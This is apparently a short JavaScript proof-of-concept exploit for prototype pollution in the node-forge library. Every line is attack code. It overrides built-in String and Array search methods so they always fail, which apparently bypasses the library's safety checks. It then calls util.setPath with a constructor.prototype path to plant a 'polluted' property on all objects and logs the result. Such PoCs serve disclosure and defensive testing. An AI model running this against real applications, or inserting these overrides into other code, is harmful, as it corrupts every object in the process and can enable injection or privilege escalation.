String.prototype.includes = () => false;
String.prototype.startsWith = () => false;
String.prototype.endsWith = () => false;
String.prototype.indexOf = () => -1;
String.prototype.lastIndexOf = () => false;
String.prototype.match = () => false;
String.prototype.search = () => false;
String.prototype.matchAll = () => false;
Array.prototype.includes = () => false;
Array.prototype.indexOf = () => -1;
console.log({}.polluted);
const nodeforge = require('node-forge');
const obj = {};
nodeforge.util.setPath(obj, [
    'constructor',
    'prototype',
    'polluted'
], 'yes');
console.log({}.polluted);